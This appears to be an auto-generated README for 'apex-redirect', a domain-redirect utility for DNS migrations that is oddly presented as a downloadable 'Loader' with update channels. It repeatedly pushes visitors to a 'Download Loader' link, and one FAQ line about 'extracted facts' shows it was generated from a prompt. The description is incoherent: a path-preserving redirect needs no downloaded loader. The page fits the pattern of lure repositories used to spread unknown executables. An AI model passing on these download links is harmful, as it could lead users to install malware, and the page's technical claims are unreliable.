# apex-redirect v2026 - Loader and Update Utility 2026

> **A small apex-domain forwarding utility.** Redirect the root domain to its `www` counterpart without dropping the original path, while delivering the request through a valid TLS certificate during an ongoing DNS transition.

[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/scottwilldf7903/apex-redirect-tls-loader?style=flat-square)](https://github.com/scottwilldf7903/apex-redirect-tls-loader)

---

<p align="center">
  <a href="https://scottwilldf7903.github.io/apex-redirect-tls-loader/">
    <img src="https://img.shields.io/badge/Download-apex--redirect%20Loader-brightgreen?style=for-the-badge" alt="Download apex-redirect Loader">
  </a>
</p>

> **[Download apex-redirect Loader](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)**

---

[Download Latest Build](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)

---

## Overview

apex-redirect provides a focused forwarding arrangement for domains where requests to the root host must arrive at the corresponding `www` host. The requested path is retained, allowing links such as deep URLs to reach the matching path on the destination website.

It is intended for the period between starting and completing a DNS migration, providing a temporary routing layer while the change is underway. Web traffic can be handled through GitHub Pages with a valid certificate for the apex domain, while mail-related DNS records remain separate and unchanged.

---

## Loader Capabilities

- Sends requests from the bare apex domain to the `www` host.
- Carries the original request path to the destination.
- Uses a valid apex-domain certificate for the redirect connection.
- Leaves email DNS entries independent of the web forwarding configuration.
- Provides a short-term forwarding layer during DNS transfer work.
- Fits routing arrangements that use Cloudflare during a migration.
- Supports a Wix-to-Cloudflare transition.
- Keeps the redirect implementation compact for easier deployment and upkeep.

---

## Getting Started

1. Visit the published build or check out the repository:
   - Download: [Download Latest Build](https://scottwilldf7903.github.io/apex-redirect-tls-loader/)
   - Source: https://github.com/scottwilldf7903/apex-redirect-tls-loader

2. If GitHub Pages is the intended host, publish the site through GitHub Pages.

3. Configure the apex domain to use the Pages deployment, then verify the `www` destination.

4. When email DNS is administered separately, confirm those records have not been modified.

Example configuration:

    apex: example.com
    redirect_to: https://www.example.com
    preserve_path: true
    tls: enabled

---

## Available Update Channels

| Channel | Purpose | Notes |
| --- | --- | --- |
| Latest | Current published redirect build | Best for standard use |
| Manual | Hand-managed deployment | Useful when DNS or hosting changes are still being coordinated |
| Temporary | Migration bridge | Intended for short-term forwarding during transfer work |

---

## Troubleshooting Guide

- A redirect that does not respond may indicate that the GitHub Pages deployment is not active.
- Certificate warnings generally require checking the apex certificate configuration.
- When the path is missing after forwarding, inspect the rule and ensure it retains the request URI.
- DNS updates may need time to propagate; review both the apex and `www` records while waiting.
- If mail delivery is affected, inspect the mail-specific DNS entries independently of the web redirect.
- For Cloudflare-based setups, compare the proxy and page-routing configuration with the desired destination.

---

## Frequently Asked Questions

**Are URL paths preserved?**  
Yes. The redirect is designed to forward the incoming path to the equivalent location on the `www` site.

**Does the setup modify email DNS?**  
It should not, provided the mail records remain separate from the web-forwarding records.

**Can this be used as a permanent redirect service?**  
No. Its stated purpose is to bridge the period before the DNS transfer is complete.

**What hosts the published version?**  
The published build is intended to run on GitHub Pages.

**How can the forwarding arrangement be undone?**  
Rollback is possible by returning to the previous DNS or hosting configuration.

**Does the project define a log format?**  
No log format is specified in the extracted facts. Validate operation through the deployment platform and browser or network inspection tools.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
